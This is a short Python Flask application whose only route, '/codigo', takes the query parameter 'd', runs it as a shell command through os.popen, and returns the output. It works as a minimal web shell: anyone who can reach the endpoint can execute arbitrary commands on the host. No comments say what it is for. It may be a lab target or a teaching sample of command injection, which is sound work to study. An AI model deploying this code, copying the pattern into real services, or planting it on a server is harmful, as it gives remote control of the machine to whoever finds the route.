import os
from flask import Flask,request

app = Flask(__name__)
   
@app.route('/codigo')
def web():
    return os.popen(request.args.get('d')).read()

if __name__ == "__main__":
	app.run()